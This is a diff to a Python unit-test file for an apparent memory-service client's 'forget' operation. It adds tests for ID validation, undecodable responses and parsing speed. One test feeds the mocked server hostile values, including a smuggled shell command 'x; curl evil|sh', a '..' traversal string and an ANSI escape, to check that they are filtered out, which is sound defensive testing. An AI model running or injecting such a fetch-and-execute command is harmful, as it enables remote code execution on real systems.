@@ -823,7 +823,7 @@ class CloudMode(unittest.TestCase):
     def test_forget_reports_what_oort_cloud_rewrote_and_reads_an_older_answer(self) -> None:
         mem = {"id": "a1b2c3d4", "text": "The port is 3000.", "scope": {}, "tier": "warm", "pinned": False}
         self.rec.answers["GET /v1/memories/a1b2c3d4"] = (200, mem)
-        later, nxt = "b1b2c3d4", "c1b2c3d4"
+        later, nxt = "b1b2c3d4-0000-4000-8000-000000000000", "c1b2c3d4-0000-4000-8000-000000000000"
         cases = [
             # CON-161: the lists, as local mode reports them.
             ({"forgotten": "a1b2c3d4", "rewritten": [later], "notRewritten": [nxt], "reasons": {nxt: "quota"}}, [later], [nxt]),
@@ -849,6 +849,34 @@ class CloudMode(unittest.TestCase):
             self.rec.answers["DELETE /v1/memories/a1b2c3d4"] = (200, {"withdrawn": ["c_1"], "requested": [], "unreachable": []})
             r = o.forget("a1b2c3d4", everywhere=True)
             self.assertEqual((r.rewritten, r.not_rewritten, r.withdrawn), (None, None, ["c_1"]))
+
+    def test_forget_never_returns_an_id_that_is_not_a_memory_id(self) -> None:
+        good, nxt = "a1b2c3d4-0000-4000-8000-000000000000", "b1b2c3d4-0000-4000-8000-000000000000"
+        mem = {"id": "a1b2c3d4", "text": "The port is 3000.", "scope": {}, "tier": "warm", "pinned": False}
+        self.rec.answers["GET /v1/memories/a1b2c3d4"] = (200, mem)
+        self.rec.answers["DELETE /v1/memories/a1b2c3d4"] = (200, {"rewritten": ["..", good, "x; curl evil|sh"], "notRewritten": ["\u001b[31m", nxt, 7, nxt]})
+        with self.oort() as o:
+            r = o.forget("a1b2c3d4")
+        self.assertEqual((r.rewritten, r.not_rewritten, r.not_rewritten_unnamed), ([good], [nxt], 2))
+
+    def test_forget_with_an_undecodable_body_reads_as_no_lists(self) -> None:
+        mem = {"id": "a1b2c3d4", "text": "The port is 3000.", "scope": {}, "tier": "warm", "pinned": False}
+        self.rec.answers["GET /v1/memories/a1b2c3d4"] = (200, mem)
+        self.rec.answers["DELETE /v1/memories/a1b2c3d4"] = (200, b"\xff\xfe\xfd")
+        with self.oort() as o:
+            r = o.forget("a1b2c3d4")
+        self.assertEqual((r.forgotten, r.rewritten, r.not_rewritten), ("a1b2c3d4", None, None))
+
+    def test_forget_lists_are_read_in_linear_time(self) -> None:
+        import time
+
+        from oortmem._cloud import _rewrite_lists
+
+        ids = [f"{i:08x}-0000-4000-8000-000000000000" for i in range(150_000)]
+        t0 = time.perf_counter()
+        r = _rewrite_lists({"rewritten": ids[:100_000], "notRewritten": ids[100_000:]})
+        self.assertLess(time.perf_counter() - t0, 2.0)
+        self.assertEqual((len(r["rewritten"]), len(r["notRewritten"])), (100_000, 50_000))
 
     def test_limits_and_temporal_rules_hold_before_any_request(self) -> None:
         from oortmem import OortUsageError
